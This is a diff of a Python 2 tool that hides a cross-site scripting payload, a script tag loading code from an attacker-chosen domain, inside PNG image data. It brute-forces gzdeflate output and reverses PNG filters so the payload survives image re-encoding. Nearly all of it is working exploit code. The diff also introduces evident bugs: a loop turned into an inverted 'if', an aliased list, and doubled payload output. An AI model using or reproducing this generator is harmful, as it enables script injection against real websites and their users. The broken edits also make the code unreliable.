@@ -7,10 +7,7 @@ def gzdeflate(string):
         return deflated
 
 def hex2bin(hexstr):
-	#binstr = hexstr.decode('hex')
-	#print hexstr
 	try:
-		#binstr = binascii.unhexlify(hexstr)
 		binstr = hexstr.decode('hex')
 	except TypeError:
 		return 'ff'
@@ -42,7 +39,6 @@ def remoteDomainParse(remoteDomain):
 def calcBruteMethod(remoteDomain, prefix, tld):
 	#Payload
 	targetPayload = "<SCRIPT SRC=//"+remoteDomain+"></SCRIPT>"
-	#start,end,keyspace = calcKeyspace(remoteDomain)
 	print "[+]PAYLOAD:"
 	print "[-]Target Payload:", targetPayload
 	
@@ -64,29 +60,36 @@ def calcBruteMethod(remoteDomain, prefix, tld):
 		return gzdeflatePayload
 def filterBypass(gzdeflatePayload):
 	print "[+]Crafting payload to bypass PNG filters..."
+	pList=[]
+	bList=[]
 	payload=[]
 	#Convert hex string into hex lists
-	pList = [gzdeflatePayload[i:i+2] for i in range(0,len(gzdeflatePayload), 2)]
-	hPlist1 = [int(('0x'+i),16) for i in pList]
-	hPlist2 = []
+	for i in range(0,len(gzdeflatePayload), 2):
+		pList.append('0x'+gzdeflatePayload[i:i+2])
+	for i in pList:
+		i = int(i,16)
+		bList.append(i)
+	#duplicate
+	bList2=bList
 
 	#reverse filter 1
 	i=0
-	while i < (len(hPlist1)-3):
-		hPlist1[i+3] = (hPlist1[i+3] + hPlist1[i]) % 256
+	while i < (len(bList)-3):
+		bList[i+3] = (bList[i+3] + bList[i]) % 256
 		i+=1
-	for filter1 in hPlist1:
-		hPlist2.append(filter1)
+	for filter1 in bList:
+		payload.append(filter1)
 
 	#reverse filter 3
 	i = 0
-	while i < (len(hPlist2)-3):
-		hPlist2[i+3] = (hPlist2[i+3] + floor(hPlist2[i] / 2)) % 256
+	while i < (len(bList2)-3):
+		bList2[i+3] = (bList2[i+3] + floor(bList2[i] / 2)) % 256
 		i += 1
-	for filter3 in hPlist2:
-		payload.append(filter3)
+	for filter3 in bList2:
+		payload.append(int(filter3))
+
 	print "[+]Filter-Proof Payload Crafted!"
-	#print "Filter-Proof Payload: %s" % payload
+	print "Filter-Proof Payload: %s" % ''.join([(hex(i)) for i in payload]).replace('0x','')
 	return payload
 
 def generateFinalPayload(payload, outputImage):
@@ -94,7 +97,7 @@ def generateFinalPayload(payload, outputImage):
 	im = Image.new('RGB', (32,32))
 	i = 0
 	c = 0
-	while (i < len(payload)):
+	if i >= len(payload):
 		r = payload[i]
 		g = payload[i+1]
 		b = payload[i+2]
@@ -112,7 +115,7 @@ def fin1te(remoteDomain, prefix, tld):
 
 def aLogue(targetPayload, prefix):
 	#Calculate keyspace
-	start = 0x11
+	start = 0x111111
 	end = 0xffffff
 	keyspace = end-start
 	print "[-]Calculated Keyspace: %s" % str(keyspace)
@@ -122,16 +125,16 @@ def aLogue(targetPayload, prefix):
 	print "[+]Starting Gzdeflate Payload Bruteforce..."
 	i=1
 	while start < end:
-		if i % 100000 == 0:
+		if i % 500000 == 0:
 			print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
 		#brute = hex(start).encode('ascii')[2:]
 		brute = hex(start)[2:]
 		if "L" in brute:
 			brute = brute[:-1]
-		#guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
-		guess = 'f399281922111510691928276e6e6020201e581b1f576e69b16375535b6f0e7f'
+		guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
+		##DEBUG
+		##guess = 'f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f'
 		deflate = gzdeflate(hex2bin(guess))
-		
 		if targetPayload.upper() in deflate.upper():
 			print "[!]GZDEFLATE PAYLOAD FOUND!"
 			print "Gzdeflate Payload String: %s" % repr(deflate)
